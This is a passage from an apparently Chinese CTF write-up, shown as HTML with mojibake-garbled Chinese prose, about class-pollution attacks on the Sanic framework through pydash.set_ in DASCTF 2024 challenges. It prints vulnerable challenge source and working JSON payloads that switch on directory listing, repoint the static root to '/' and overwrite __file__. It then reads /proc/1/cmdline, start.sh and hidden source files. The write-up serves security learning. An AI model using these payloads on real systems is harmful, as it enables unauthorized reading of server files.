class="literal">False</span>,</span></span><br><span class="line"><span class="params">        index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure><p>â€‹æˆ‘ä»¬å‘ç°åªè¦æˆ‘ä»¬å°† directory æ±¡æŸ“ä¸ºæ ¹ç›®å½•ï¼Œdirectory_view æ±¡æŸ“ä¸º Trueï¼Œå°±å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶äº†ã€‚</p><p><strong>åç»­æˆ‘åœ¨ Windows ä¸Šæµ‹è¯•æ¬¡æ¬¡è¿è¡Œä¸äº†ï¼Œè¿™é‡Œå°±ç›´æ¥å€Ÿä¸€ä¸‹å¤§ä½¬ä»¬çš„ä»£ç åœ¨è¿™å„¿ï¼Œæˆ‘å°±ä¸å®æ“äº†</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="comment">#from sanic_session import Session</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"><span class="comment">#Session(app)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment">#async def index(request):</span></span><br><span class="line">    <span class="comment">#return html(open(&#x27;static/index.html&#x27;).read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&quot;/login&quot;)</span></span><br><span class="line"><span class="comment">#async def login(request):</span></span><br><span class="line">    <span class="comment">#user = request.cookies.get(&quot;user&quot;)</span></span><br><span class="line">    <span class="comment">#if user.lower() == &#x27;adm;n&#x27;:</span></span><br><span class="line">        <span class="comment">#request.ctx.session[&#x27;admin&#x27;] = True</span></span><br><span class="line">        <span class="comment">#return text(&quot;login success&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#return text(&quot;login fail&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">print</span>(app.router.name_index)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(app.router.name_index[&#x27;name&#x27;].directory_view)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¾“å‡ºåº”è¯¥æ¥è¿‘è¿™æ ·ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/de66f739b68d4092a1c471efee8f4a6b.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹çœ‹å‡ºæ¥äº†è·¯ç”±æ˜¯  <code>&quot;__mp_main__.static&quot;</code> ï¼Œä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­äº†ï¼ˆå…·ä½“é“¾å­æ€ä¹ˆæ‰¾ï¼Œå‚è€ƒ gxngxngxn å¤§ä½¬çš„æ–‡ç« ï¼‰ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¸Šé¢çš„ payload æ˜¯å¼€å¯ç›®å½•åŠŸèƒ½ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ª payload æ˜¯å°†æŒ‡å®šç›®å½•æ±¡æŸ“ä¸ºæ ¹ç›®å½•ï¼Œä¹‹åè®¿é—® /static/ ç›®å½•ï¼Œå°±èƒ½çœ‹åˆ°æ ¹ç›®å½•ä¸‹å¼€å§‹çš„æ‰€æœ‰æ–‡ä»¶çš„æ–‡ä»¶åäº† /</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/flagæ–‡ä»¶åå­—&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ª payload æ˜¯ç”¨æ¥è¯» flag æ–‡ä»¶çš„ï¼Œä¹‹åè®¿é—® src è·¯ç”±å³å¯è·å¾— flagã€‚</p><h2 id="dasctf2024å¤å­£æŒ‘æˆ˜èµ›sanics-revenge"><a class="markdownIt-Anchor" href="#dasctf2024å¤å­£æŒ‘æˆ˜èµ›sanics-revenge">#</a> [DASCTF2024 å¤å­£æŒ‘æˆ˜èµ›] Sanicâ€™s revenge</h2><p>â€‹é¢˜ç›®ç»™äº†ä¸ªé™„ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ç›´æ¥å¼€å§‹å®¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçš„æºç å¥½åƒè¢«adminåˆ æ‰äº†ä¸€äº›ï¼Œå¬ä»–è¯´é‡Œé¢è—æœ‰å¤§ç§˜å¯†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸€çœ¼ä¸ä¸çœŸã€‚è¿™ä¸ªæ„Ÿè§‰å’Œä¹‹å‰æ‰“çš„é¢˜éƒ½ä¸ä¸€æ ·ï¼Œå› ä¸ºä¹‹å‰çš„æ€è·¯éƒ½æ˜¯æ±¡æŸ“ <code>__file__</code> å±æ€§ï¼Œä½†æ˜¯è¿™ä¸€æ¬¡ä¼¼ä¹ä¸æ˜¯ï¼Œå¹¶ä¸”ï¼Œpollute è·¯ç”±è¿˜è¿‡æ»¤äº† parts å’Œ proc ä»¥åŠé™åˆ¶ value ä¸èƒ½æ˜¯åˆ—è¡¨ã€‚</p><p>â€‹è¿™ä¸ªé¢˜æˆ‘ä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼Œæ„Ÿè§‰å¾ˆé€†å¤©ï¼Œè€ƒç‚¹ä¸»è¦çš„æ˜¯ sanic æ¡†æ¶çš„æ¼æ´é¢˜ï¼Œå…ˆè´´ä¸€ä¸‹åŸç†å§ï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ˜ç™½ã€‚</p><p>â€‹é¦–å…ˆæ˜¯æ ¹åŸº static å‡½æ•°ï¼Œä¹‹åï¼Œä¹‹åè·Ÿè¿› <code>DirectoryHandler</code>  ç±»ï¼Œæ‰¾åˆ°äº†å¦‚ä¸‹ä¸¤æ®µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">      current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.directory_view:</span><br><span class="line">          <span class="keyword">return</span> self._index(</span><br><span class="line">              self.directory / current, path, request.app.debug</span><br><span class="line">          )</span><br></pre></td></tr></table></figure><p>â€‹å½“å¼€å¯äº†ç›®å½•åŠŸèƒ½åï¼Œå°±ä¼šè¿›å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self._index(</span><br><span class="line">             self.directory / current, path, request.app.debug</span><br><span class="line">         )</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œè·Ÿè¿› <code>_index</code>  çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_index</span>(<span class="params">self, location: Path, path: <span class="built_in">str</span>, debug: <span class="built_in">bool</span></span>):</span><br><span class="line">    <span class="comment"># Remove empty path elements, append slash</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;//&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="keyword">not</span> path.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(</span><br><span class="line">            <span class="string">&quot;/&quot;</span> + <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;<span class="subst">&#123;p&#125;</span>/&quot;</span> <span class="keyword">for</span> p <span class="keyword">in</span> path.split(<span class="string">&quot;/&quot;</span>) <span class="keyword">if</span> p])</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Render file browser</span></span><br><span class="line">    page = DirectoryPage(self._iter_files(location), path, debug)</span><br><span class="line">    <span class="keyword">return</span> html(page.render())</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜¾ç„¶ï¼Œ <code>_index</code>  æ˜¯ä¸€ä¸ªæ‹¼æ¥å‡½æ•°ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ‹¼æ¥ç›®å½•çš„ã€‚æ ¹æ®ä¸‹é¢è¿™ä¸€è¡Œï¼Œæˆ‘ä»¬åˆæœ‰äº†å¯ä»¥æ“ä½œçš„ç©ºé—´äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç°äº†å•¥ï¼Ÿè¿™é‡Œ path åœ¨è¢«åˆ†å‰²çš„æ—¶å€™æœ‰ä¸ªæƒ…å†µï¼Œå°±æ˜¯å°†è·¯å¾„ä» base å­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„æ‰€æœ‰å­—ç¬¦ä¸²å»æ‰å¤´å°¾çš„ <code>'/'</code>  å­—ç¬¦åè¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬æŠŠ base å±æ€§æ±¡æŸ“æˆæŒ‡å®šçš„å­—ç¬¦ä¸²ä¹‹åï¼Œåé¢å¦‚æœå‡ºç°äº†ä¸¤ä¸ªç‚¹ï¼Œä¹Ÿå°±æ˜¯ <code>..</code>  å°±è¯´æ˜äº† current è¿”å›çš„å­—ç¬¦ä¸²å¯èƒ½å­˜åœ¨è·¯å¾„ç©¿è¶Šã€‚</p><p>â€‹å¥½äº†ï¼Œ å†å›æ¥çœ‹çœ‹è¿™ä¸ªé¢˜ï¼Œé¦–å…ˆï¼Œæœ€å¥½åº”è¯¥å…ˆè·å–å®Œæ•´çš„æºä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åƒä¹‹å‰çš„é¢˜ä¸€æ ·æ±¡æŸ“ <code>directory_view</code>  å±æ€§æ‰“å¼€é™æ€æ–‡ä»¶ç›®å½•ã€‚payload å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#è¿™ä¸ªpayloadä¸çŸ¥é“ä¸ºå•¥è®¿é—®staticç›®å½•çš„æ—¶å€™æ„Ÿè§‰æ²¡å•¥å˜åŒ–ï¼Œä½†æ˜¯å¦‚æœåŠ ä¸Šäº†åƒä»€ä¹ˆ/static/etc/passwdä¹‹ç±»çš„æ–‡ä»¶å´èƒ½è®¿é—®åˆ°</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/d67ac7ea195d460b8d80bdeb0f7d00a9.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ—¢ç„¶èƒ½æˆï¼Œé‚£æ­£å¸¸è®¿é—® <code>/static/proc/1/cmdline</code> ï¼Œå‘ç°äº†é‡è¦çš„ä¸œè¥¿ï¼Œå°±æ˜¯</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash  /start.sh</span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® <code> /static/start.sh</code>  ä¹‹åè·å¾—ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [[ -f /flag.sh ]]; then</span><br><span class="line">source /flag.sh</span><br><span class="line">rm -f /flag.sh</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">python3 /app/2Q17A58T9F65y5i8.py</span><br></pre></td></tr></table></figure><p>â€‹æ‰¾åˆ°äº†æ–‡ä»¶åäº†ï¼Œè¯»å– <code>/static/app/2Q17A58T9F65y5i8.py</code>  çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æºç å¥½åƒè¢«adminåˆ æ‰äº†ä¸€äº›ï¼Œå¬ä»–è¯´é‡Œé¢è—æœ‰å¤§ç§˜å¯†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line">   </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title 